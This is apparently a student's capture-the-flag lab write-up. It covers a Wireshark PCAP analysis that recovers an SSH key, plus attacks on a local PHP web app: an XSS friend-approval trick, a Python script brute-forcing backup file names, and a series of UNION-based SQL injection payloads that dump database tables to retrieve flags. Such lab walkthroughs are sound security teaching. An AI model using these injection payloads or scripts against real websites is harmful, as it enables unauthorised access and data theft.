# Task 1

The first thing to do is open the PCAP file inside **Wireshark** in order to properly analyze/filter data that we need. Due to the fact that SSH and TLS protocol use encrypted communication which we will not be able to understand by investigating the packets, we can filter them out.

![[Pasted image 20210429001323.png]]

## HTTP

One of the most important feature Wireshark provides for analysing HTTP traffic is the File->Export Objects->HTTP.

![[Pasted image 20210429001449.png]]

We can now view the files that were used during the protocol. Due to the fact that the only plain/text one is todo.txt, we can use the *Preview* option only on it.

**todo.txt**
![[Pasted image 20210429001522.png]]

For the others, we need to follow the HTTP stream and see the raw bytes transferred.

**key.pub**
![[Pasted image 20210429001844.png]]

**certificate.pem**
![[Pasted image 20210429001808.png]]


## TELNET

There is also TELNET related traffic which we can also see by following the stream.

![[Pasted image 20210429002121.png]]

![[Pasted image 20210429002459.png]]

![[Pasted image 20210429002821.png]]

## FTP

Never the less, there is also data transferred via FTP protocol.

![[Pasted image 20210429002316.png]]


Using the private **OpenSSH** key from transfered via the Telnet protocol, we could log into **secure\@isc2021.root.sx**.

```bash
┌─[kayn@parrot]─[~/Documents/ISC/tema2/task1]
└──╼ $ssh secure@isc2021.root.sx -i secure.key 
You did it! Congratulations!

Your flag is:

SpeishFlag{6TXftdQAzDoXq8GXb0hXPblEv6jf4QeZ}

Connection to isc2021.root.sx closed.
```


## Flag

**SpeishFlag{6TXftdQAzDoXq8GXb0hXPblEv6jf4QeZ}**

# Task 2

## Setup

```bash
┌─[kayn@parrot]─[~/Documents/ISC/tema2/task2]
└──╼ $bash connect.sh 
Master running (pid=37031)
Allocated server port: 16653
Web server starting... please be patient! You can press Ctrl+C to stop it.
Initialization succeeded! Starting services...
2021-04-29 10:09:29,884 INFO Set uid to user 0 succeeded
2021-04-29 10:09:29,889 INFO RPC interface 'supervisor' initialized
2021-04-29 10:09:29,890 INFO supervisord started with pid 1
2021-04-29 10:09:30,892 INFO spawned: 'friends-daemon' with pid 25
2021-04-29 10:09:30,895 INFO spawned: 'nginx' with pid 26
2021-04-29 10:09:30,904 INFO spawned: 'php-fpm7' with pid 27
2021-04-29 10:09:31,968 INFO success: friends-daemon entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2021-04-29 10:09:31,969 INFO success: nginx entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2021-04-29 10:09:31,969 INFO success: php-fpm7 entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
```

![[Pasted image 20210429131020.png]]


## Register Account

![[Pasted image 20210429131209.png]]

![[Pasted image 20210429131532.png]]

![[Pasted image 20210429131607.png]]

![[Pasted image 20210429131627.png]]

![[Pasted image 20210429131718.png]]

![[Pasted image 20210429131746.png]]

### Flag
**SpeishFlag{pY2WfWcLu3xeC2vW3kjxUq3LPvqjQdnG}**


## Friend Approval

![[Pasted image 20210429131921.png]]

![[Pasted image 20210429141049.png]]

![[Pasted image 20210429134424.png]]

![[Pasted image 20210429141204.png]]

![[Pasted image 20210429141226.png]]

```bash
└──╼ $bash connect.sh 
Master running (pid=72123)
Allocated server port: 17252
Web server starting... please be patient! You can press Ctrl+C to stop it.
Initialization succeeded! Starting services...
2021-04-29 11:10:33,252 INFO Set uid to user 0 succeeded
2021-04-29 11:10:33,257 INFO RPC interface 'supervisor' initialized
2021-04-29 11:10:33,258 INFO supervisord started with pid 1
2021-04-29 11:10:34,261 INFO spawned: 'friends-daemon' with pid 25
2021-04-29 11:10:34,264 INFO spawned: 'nginx' with pid 26
2021-04-29 11:10:34,267 INFO spawned: 'php-fpm7' with pid 27
2021-04-29 11:10:35,340 INFO success: friends-daemon entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2021-04-29 11:10:35,341 INFO success: nginx entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2021-04-29 11:10:35,343 INFO success: php-fpm7 entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
XSS simulator: saw <script> in post!
XSS simulator: caught acceptFriend(8) call
XSS simulator: friend(s) accepted!
```

![[Pasted image 20210429141306.png]]


### Flag

**SpeishFlag{6x09h1dO6frbS6zi4Jt3savPZ2IIJfji}**



## Website backup

![[Pasted image 20210429145329.png]]

```python
import requests


URL = "http://localhost:8080/backup-YYYY-MM-DD.tar.gz"
cookie = {"PHPSESSID": "3is2vgj7sfcrod60lev39e2fhu"}


def send_request(i, j, k):
	url = URL
	url = url.replace("YYYY", i).replace("MM", j).replace("DD", k)
	r = requests.get(url=url, cookies=cookie)

	#print(url)
	if r.status_code != 404:
		print(f"[+] Found backup file: {i}, {j}, {k}")
		exit(0)


for i in range(2021, 0, -1):
	print(f"[!] Searching year {str(i)}")
	for j in range(12, 0, -1):
		for k in range(31, 0, -1):

			send_request(str(i), str(j), str(k))
			send_request(str(i), str(j).zfill(2), str(k))
			send_request(str(i), str(j).zfill(2), str(k).zfill(2))
			send_request(str(i), str(j), str(k).zfill(2))
```

```bash
┌─[✗]─[kayn@parrot]─[~/Documents/ISC/tema2/task2]                                                                  
└──╼ $clear ; python brute.py                                                                                      
[!] Searching year 2021                                                                                            
[+] Found backup file: 2021, 04, 6
```

```bash
┌─[kayn@parrot]─[~/Documents/ISC/tema2/task2/web]
└──╼ $binwalk -e backup-2021-04-6.tar.gz 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)
3677650       0x381DD2        gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)

┌─[kayn@parrot]─[~/Documents/ISC/tema2/task2/web]
└──╼ $ls
backup-2021-04-6.tar.gz  _backup-2021-04-6.tar.gz.extracted  brute.py
┌─[kayn@parrot]─[~/Documents/ISC/tema2/task2/web]
└──╼ $cd _backup-2021-04-6.tar.gz.extracted/
┌─[kayn@parrot]─[~/Documents/ISC/tema2/task2/web/_backup-2021-04-6.tar.gz.extracted]
└──╼ $ls
0  0.gz  381DD2  381DD2.gz
```

![[Pasted image 20210429152502.png]]

### Flag

**SpeishFlag{kdI8QCUxi24I9Y4esLMyY6jK1cGE8R99}**


## SQL Backdoor

```php
	public function login()
	{
		if (!empty($_POST)) {
			if (empty($_POST["catname"]) || empty($_POST["password"]) || empty($_POST["agreement"])) {
				error_log("Invalid POST parameters: " . var_export($_POST, true));
				$this->Redirect("/?err=login");return;
			}
			$stmt = $this->db->Query("SELECT * FROM `accounts` WHERE username = ? AND password = SHA(?)",
				array($_POST["catname"], $_POST["password"]));
			$account = $stmt->fetch();
			if (!$account) {
				error_log("Invalid credentials: " . var_export($_POST, true));
				$this->Redirect("/?err=login");return;
			}
			$_SESSION["auth"] = $account;
		}
		$this->Redirect("/");
	}
```

![[Pasted image 20210429153633.png]]

![[Pasted image 20210429153658.png]]

![[Pasted image 20210429154116.png]]

Payload: **test' UNION SELECT 1,2,3,4,5,6,7,8 -- -**

![[Pasted image 20210429154139.png]]

Payload: **'UNION SELECT 1,2,@@version,4,5,database(),7,8-- -**

![[Pasted image 20210429154635.png]]

![[Pasted image 20210429202754.png]]

![[Pasted image 20210429203635.png]]

![[Pasted image 20210429203619.png]]

Payload: **'UNION SELECT 1,2,3,4,5,table_name,7,8 FROM information_schema.tables WHEREtable_schema='web_4904' LIMIT 0,1-- -**

![[Pasted image 20210429204113.png]]

Payload: **'UNION SELECT 1,2,3,4,5,table_name,7,8 FROM information_schema.tables WHERE table_schema='web_4904' LIMIT 1,1-- -**

![[Pasted image 20210429204134.png]]

Payload: **'UNION SELECT 1,2,3,4,5,column_name,7,8 FROM information_schema.columns WHERE table_schema='web_4904' and table_name='flags38364' LIMIT 0,1-- -**

![[Pasted image 20210429204423.png]]

Payload: **'UNION SELECT 1,2,3,4,5,column_name,7,8 FROM information_schema.columns WHERE table_schema='web_4904' and table_name='flags38364' LIMIT 1,1-- -**

![[Pasted image 20210429204356.png]]

Payload: **'UNION SELECT 1,2,id,4,5,zaflag,7,8 FROM flags38364 LIMIT 0,1-- -**

![[Pasted image 20210429204623.png]]

### Flag

**SpeishFlag{0xiTyXDGEbDJafiQZArBNprEWKCQnwwK}**


## File Upload

![[Pasted image 20210429215036.png]]

![[Pasted image 20210429222630.png]]

![[Pasted image 20210429222649.png]]